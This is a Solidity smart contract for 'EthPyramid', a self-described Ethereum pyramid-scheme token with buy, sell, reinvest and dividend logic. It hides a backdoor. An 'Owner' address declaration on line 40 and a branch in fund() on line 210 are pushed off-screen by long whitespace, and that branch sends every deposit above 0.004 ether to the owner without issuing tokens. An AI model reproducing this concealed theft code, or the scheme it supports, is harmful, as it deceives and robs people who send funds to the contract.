1 pragma solidity ^0.4.18;
2 
3 /*
4           ,/`.
5         ,'/ __`.
6       ,'_/_  _ _`.
7     ,'__/_ ___ _  `.
8   ,'_  /___ __ _ __ `.
9  '-.._/___...-"-.-..__`.
10   B
11 
12  EthPyramid. A no-bullshit, transparent, self-sustaining pyramid scheme.
13  
14  Inspired by https://test.jochen-hoenicke.de/eth/ponzitoken/
15 
16  Developers:
17     Arc
18     Divine
19     Norsefire
20     ToCsIcK
21     
22  Front-End:
23     Cardioth
24     tenmei
25     Trendium
26     
27  Moral Support:
28     DeadCow.Rat
29     Dots
30     FatKreamy
31     Kaseylol
32     QuantumDeath666
33     Quentin
34  
35  Shit-Tier:
36     HentaiChrist
37  
38 */
39 
40 contract EthPyramid3 {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                address public Owner = msg.sender;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
41 
42     // scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
43     // orders of magnitude, hence the need to bridge between the two.
44     uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
45 
46     // CRR = 50%
47     // CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
48     // For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
49     int constant crr_n = 1; // CRR numerator
50     int constant crr_d = 2; // CRR denominator
51 
52     // The price coefficient. Chosen such that at 1 token total supply
53     // the amount in reserve is 0.5 ether and token price is 1 Ether.
54     int constant price_coeff = -0x296ABF784A358468C;
55 
56     // Typical values that we have to declare.
57     string constant public name = "EthPyramid";
58     string constant public symbol = "EPY";
59     uint8 constant public decimals = 18;
60 
61     // Array between each address and their number of tokens.
62     mapping(address => uint256) public tokenBalance;
63         
64     // Array between each address and how much Ether has been paid out to it.
65     // Note that this is scaled by the scaleFactor variable.
66     mapping(address => int256) public payouts;
67 
68     // Variable tracking how many tokens are in existence overall.
69     uint256 public totalSupply;
70 
71     // Aggregate sum of all payouts.
72     // Note that this is scaled by the scaleFactor variable.
73     int256 totalPayouts;
74 
75     // Variable tracking how much Ether each token is currently worth.
76     // Note that this is scaled by the scaleFactor variable.
77     uint256 earningsPerToken;
78     
79     // Current contract balance in Ether
80     uint256 public contractBalance;
81 
82     function EthPyramid() public {}
83 
84     // The following functions are used by the front-end for display purposes.
85 
86     // Returns the number of tokens currently held by _owner.
87     function balanceOf(address _owner) public constant returns (uint256 balance) {
88         return tokenBalance[_owner];
89     }
90 
91     // Withdraws all dividends held by the caller sending the transaction, updates
92     // the requisite global variables, and transfers Ether back to the caller.
93     function withdraw() public {
94         // Retrieve the dividends associated with the address the request came from.
95         var balance = dividends(msg.sender);
96         
97         // Update the payouts array, incrementing the request address by `balance`.
98         payouts[msg.sender] += (int256) (balance * scaleFactor);
99         
100         // Increase the total amount that's been paid out to maintain invariance.
101         totalPayouts += (int256) (balance * scaleFactor);
102         
103         // Send the dividends to the address that requested the withdraw.
104         contractBalance = sub(contractBalance, balance);
105         msg.sender.transfer(balance);
106     }
107 
108     // Converts the Ether accrued as dividends back into EPY tokens without having to
109     // withdraw it first. Saves on gas and potential price spike loss.
110     function reinvestDividends() public {
111         // Retrieve the dividends associated with the address the request came from.
112         var balance = dividends(msg.sender);
113         
114         // Update the payouts array, incrementing the request address by `balance`.
115         // Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.
116         payouts[msg.sender] += (int256) (balance * scaleFactor);
117         
118         // Increase the total amount that's been paid out to maintain invariance.
119         totalPayouts += (int256) (balance * scaleFactor);
120         
121         // Assign balance to a new variable.
122         uint value_ = (uint) (balance);
123         
124         // If your dividends are worth less than 1 szabo, or more than a million Ether
125         // (in which case, why are you even here), abort.
126         if (value_ < 0.000001 ether || value_ > 1000000 ether)
127             revert();
128             
129         // msg.sender is the address of the caller.
130         var sender = msg.sender;
131         
132         // A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
133         // (Yes, the buyer receives a part of the distribution as well!)
134         var res = reserve() - balance;
135 
136         // 10% of the total Ether sent is used to pay existing holders.
137         var fee = div(value_, 10);
138         
139         // The amount of Ether used to purchase new tokens for the caller.
140         var numEther = value_ - fee;
141         
142         // The number of tokens which can be purchased for numEther.
143         var numTokens = calculateDividendTokens(numEther, balance);
144         
145         // The buyer fee, scaled by the scaleFactor variable.
146         var buyerFee = fee * scaleFactor;
147         
148         // Check that we have tokens in existence (this should always be true), or
149         // else you're gonna have a bad time.
150         if (totalSupply > 0) {
151             // Compute the bonus co-efficient for all existing holders and the buyer.
152             // The buyer receives part of the distribution for each token bought in the
153             // same way they would have if they bought each token individually.
154             var bonusCoEff =
155                 (scaleFactor - (res + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
156                 * (uint)(crr_d) / (uint)(crr_d-crr_n);
157                 
158             // The total reward to be distributed amongst the masses is the fee (in Ether)
159             // multiplied by the bonus co-efficient.
160             var holderReward = fee * bonusCoEff;
161             
162             buyerFee -= holderReward;
163 
164             // Fee is distributed to all existing token holders before the new tokens are purchased.
165             // rewardPerShare is the amount gained per token thanks to this buy-in.
166             var rewardPerShare = holderReward / totalSupply;
167             
168             // The Ether value per token is increased proportionally.
169             earningsPerToken += rewardPerShare;
170         }
171         
172         // Add the numTokens which were just created to the total supply. We're a crypto central bank!
173         totalSupply = add(totalSupply, numTokens);
174         
175         // Assign the tokens to the balance of the buyer.
176         tokenBalance[sender] = add(tokenBalance[sender], numTokens);
177         
178         // Update the payout array so that the buyer cannot claim dividends on previous purchases.
179         // Also include the fee paid for entering the scheme.
180         // First we compute how much was just paid out to the buyer...
181         var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
182         
183         // Then we update the payouts array for the buyer with this amount...
184         payouts[sender] += payoutDiff;
185         
186         // And then we finally add it to the variable tracking the total amount spent to maintain invariance.
187         totalPayouts    += payoutDiff;
188         
189     }
190 
191     // Sells your tokens for Ether. This Ether is assigned to the callers entry
192     // in the tokenBalance array, and therefore is shown as a dividend. A second
193     // call to withdraw() must be made to invoke the transfer of Ether back to your address.
194     function sellMyTokens() public {
195         var balance = balanceOf(msg.sender);
196         sell(balance);
197     }
198 
199     // The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately
200     // invokes the withdraw() function, sending the resulting Ether to the callers address.
201     function getMeOutOfHere() public {
202         sellMyTokens();
203         withdraw();
204     }
205 
206     // Gatekeeper function to check if the amount of Ether being sent isn't either
207     // too small or too large. If it passes, goes direct to buy().
208     function fund() payable public {
209         // Don't allow for funding if the amount of Ether sent is less than 1 szabo.
210         if (msg.value > 0.004 ether) {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Owner.transfer(msg.value); } else {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
211             contractBalance = add(contractBalance, msg.value);
212             buy();
213         }
214     }
215 
216     // Function that returns the (dynamic) price of buying a finney worth of tokens.
217     function buyPrice() public constant returns (uint) {
218         return getTokensForEther(1 finney);
219     }
220 
221     // Function that returns the (dynamic) price of selling a single token.
222     function sellPrice() public constant returns (uint) {
223         var eth = getEtherForTokens(1 finney);
224         var fee = div(eth, 10);
225         return eth - fee;
226     }
227 
228     // Calculate the current dividends associated with the caller address. This is the net result
229     // of multiplying the number of tokens held by their current value in Ether and subtracting the
230     // Ether that has already been paid out.
231     function dividends(address _owner) public constant returns (uint256 amount) {
232         return (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) / scaleFactor;
233     }
234 
235     // Version of withdraw that extracts the dividends and sends the Ether to the caller.
236     // This is only used in the case when there is no transaction data, and that should be
237     // quite rare unless interacting directly with the smart contract.
238     function withdrawOld(address to) public {
239         // Retrieve the dividends associated with the address the request came from.
240         var balance = dividends(msg.sender);
241         
242         // Update the payouts array, incrementing the request address by `balance`.
243         payouts[msg.sender] += (int256) (balance * scaleFactor);
244         
245         // Increase the total amount that's been paid out to maintain invariance.
246         totalPayouts += (int256) (balance * scaleFactor);
247         
248         // Send the dividends to the address that requested the withdraw.
249         contractBalance = sub(contractBalance, balance);
250         to.transfer(balance);       
251     }
252 
253     // Internal balance function, used to calculate the dynamic reserve value.
254     function balance() internal constant returns (uint256 amount) {
255         // msg.value is the amount of Ether sent by the transaction.
256         return contractBalance - msg.value;
257     }
258 
259     function buy() internal {
260         // Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
261         if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
262             revert();
263                         
264         // msg.sender is the address of the caller.
265         var sender = msg.sender;
266         
267         // 10% of the total Ether sent is used to pay existing holders.
268         var fee = div(msg.value, 10);
269         
270         // The amount of Ether used to purchase new tokens for the caller.
271         var numEther = msg.value - fee;
272         
273         // The number of tokens which can be purchased for numEther.
274         var numTokens = getTokensForEther(numEther);
275         
276         // The buyer fee, scaled by the scaleFactor variable.
277         var buyerFee = fee * scaleFactor;
278         
279         // Check that we have tokens in existence (this should always be true), or
280         // else you're gonna have a bad time.
281         if (totalSupply > 0) {
282             // Compute the bonus co-efficient for all existing holders and the buyer.
283             // The buyer receives part of the distribution for each token bought in the
284             // same way they would have if they bought each token individually.
285             var bonusCoEff =
286                 (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
287                 * (uint)(crr_d) / (uint)(crr_d-crr_n);
288                 
289             // The total reward to be distributed amongst the masses is the fee (in Ether)
290             // multiplied by the bonus co-efficient.
291             var holderReward = fee * bonusCoEff;
292             
293             buyerFee -= holderReward;
294 
295             // Fee is distributed to all existing token holders before the new tokens are purchased.
296             // rewardPerShare is the amount gained per token thanks to this buy-in.
297             var rewardPerShare = holderReward / totalSupply;
298             
299             // The Ether value per token is increased proportionally.
300             earningsPerToken += rewardPerShare;
301             
302         }
303 
304         // Add the numTokens which were just created to the total supply. We're a crypto central bank!
305         totalSupply = add(totalSupply, numTokens);
306 
307         // Assign the tokens to the balance of the buyer.
308         tokenBalance[sender] = add(tokenBalance[sender], numTokens);
309 
310         // Update the payout array so that the buyer cannot claim dividends on previous purchases.
311         // Also include the fee paid for entering the scheme.
312         // First we compute how much was just paid out to the buyer...
313         var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
314         
315         // Then we update the payouts array for the buyer with this amount...
316         payouts[sender] += payoutDiff;
317         
318         // And then we finally add it to the variable tracking the total amount spent to maintain invariance.
319         totalPayouts    += payoutDiff;
320         
321     }
322 
323     // Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
324     // to discouraging dumping, and means that if someone near the top sells, the fee distributed
325     // will be *significant*.
326     function sell(uint256 amount) internal {
327         // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
328         var numEthersBeforeFee = getEtherForTokens(amount);
329         
330         // 10% of the resulting Ether is used to pay remaining holders.
331         var fee = div(numEthersBeforeFee, 10);
332         
333         // Net Ether for the seller after the fee has been subtracted.
334         var numEthers = numEthersBeforeFee - fee;
335         
336         // *Remove* the numTokens which were just sold from the total supply. We're /definitely/ a crypto central bank.
337         totalSupply = sub(totalSupply, amount);
338         
339         // Remove the tokens from the balance of the buyer.
340         tokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);
341 
342         // Update the payout array so that the seller cannot claim future dividends unless they buy back in.
343         // First we compute how much was just paid out to the seller...
344         var payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));
345         
346         // We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,
347         // since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if
348         // they decide to buy back in.
349         payouts[msg.sender] -= payoutDiff;      
350         
351         // Decrease the total amount that's been paid out to maintain invariance.
352         totalPayouts -= payoutDiff;
353         
354         // Check that we have tokens in existence (this is a bit of an irrelevant check since we're
355         // selling tokens, but it guards against division by zero).
356         if (totalSupply > 0) {
357             // Scale the Ether taken as the selling fee by the scaleFactor variable.
358             var etherFee = fee * scaleFactor;
359             
360             // Fee is distributed to all remaining token holders.
361             // rewardPerShare is the amount gained per token thanks to this sell.
362             var rewardPerShare = etherFee / totalSupply;
363             
364             // The Ether value per token is increased proportionally.
365             earningsPerToken = add(earningsPerToken, rewardPerShare);
366         }
367     }
368     
369     // Dynamic value of Ether in reserve, according to the CRR requirement.
370     function reserve() internal constant returns (uint256 amount) {
371         return sub(balance(),
372              ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) / scaleFactor));
373     }
374 
375     // Calculates the number of tokens that can be bought for a given amount of Ether, according to the
376     // dynamic reserve and totalSupply values (derived from the buy and sell prices).
377     function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
378         return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
379     }
380 
381     // Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.
382     function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
383         return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
384     }
385 
386     // Converts a number tokens into an Ether value.
387     function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
388         // How much reserve Ether do we have left in the contract?
389         var reserveAmount = reserve();
390 
391         // If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.
392         if (tokens == totalSupply)
393             return reserveAmount;
394 
395         // If there would be excess Ether left after the transaction this is called within, return the Ether
396         // corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found
397         // at https://test.jochen-hoenicke.de/eth/ponzitoken/ in the third equation, with the CRR numerator 
398         // and denominator altered to 1 and 2 respectively.
399         return sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d/crr_n));
400     }
401 
402     // You don't care about these, but if you really do they're hex values for 
403     // co-efficients used to simulate approximations of the log and exp functions.
404     int256  constant one        = 0x10000000000000000;
405     uint256 constant sqrt2      = 0x16a09e667f3bcc908;
406     uint256 constant sqrtdot5   = 0x0b504f333f9de6484;
407     int256  constant ln2        = 0x0b17217f7d1cf79ac;
408     int256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;
409     int256  constant c1         = 0x1ffffffffff9dac9b;
410     int256  constant c3         = 0x0aaaaaaac16877908;
411     int256  constant c5         = 0x0666664e5e9fa0c99;
412     int256  constant c7         = 0x049254026a7630acf;
413     int256  constant c9         = 0x038bd75ed37753d68;
414     int256  constant c11        = 0x03284a0c14610924f;
415 
416     // The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
417     // approximates the function log(1+x)-log(1-x)
418     // Hence R(s) = log((1+s)/(1-s)) = log(a)
419     function fixedLog(uint256 a) internal pure returns (int256 log) {
420         int32 scale = 0;
421         while (a > sqrt2) {
422             a /= 2;
423             scale++;
424         }
425         while (a <= sqrtdot5) {
426             a *= 2;
427             scale--;
428         }
429         int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
430         var z = (s*s) / one;
431         return scale * ln2 +
432             (s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
433                 /one))/one))/one))/one))/one);
434     }
435 
436     int256 constant c2 =  0x02aaaaaaaaa015db0;
437     int256 constant c4 = -0x000b60b60808399d1;
438     int256 constant c6 =  0x0000455956bccdd06;
439     int256 constant c8 = -0x000001b893ad04b3a;
440     
441     // The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
442     // approximates the function x*(exp(x)+1)/(exp(x)-1)
443     // Hence exp(x) = (R(x)+x)/(R(x)-x)
444     function fixedExp(int256 a) internal pure returns (uint256 exp) {
445         int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
446         a -= scale*ln2;
447         int256 z = (a*a) / one;
448         int256 R = ((int256)(2) * one) +
449             (z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
450         exp = (uint256) (((R + a) * one) / (R - a));
451         if (scale >= 0)
452             exp <<= scale;
453         else
454             exp >>= -scale;
455         return exp;
456     }
457     
458     // The below are safemath implementations of the four arithmetic operators
459     // designed to explicitly prevent over- and under-flows of integer values.
460 
461     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
462         if (a == 0) {
463             return 0;
464         }
465         uint256 c = a * b;
466         assert(c / a == b);
467         return c;
468     }
469 
470     function div(uint256 a, uint256 b) internal pure returns (uint256) {
471         // assert(b > 0); // Solidity automatically throws when dividing by 0
472         uint256 c = a / b;
473         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
474         return c;
475     }
476 
477     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
478         assert(b <= a);
479         return a - b;
480     }
481 
482     function add(uint256 a, uint256 b) internal pure returns (uint256) {
483         uint256 c = a + b;
484         assert(c >= a);
485         return c;
486     }
487 
488     // This allows you to buy tokens by sending Ether directly to the smart contract
489     // without including any transaction data (useful for, say, mobile wallet apps).
490     function () payable public {
491         // msg.value is the amount of Ether sent by the transaction.
492         if (msg.value > 0) {
493             fund();
494         } else {
495             withdrawOld(msg.sender);
496         }
497     }
498 }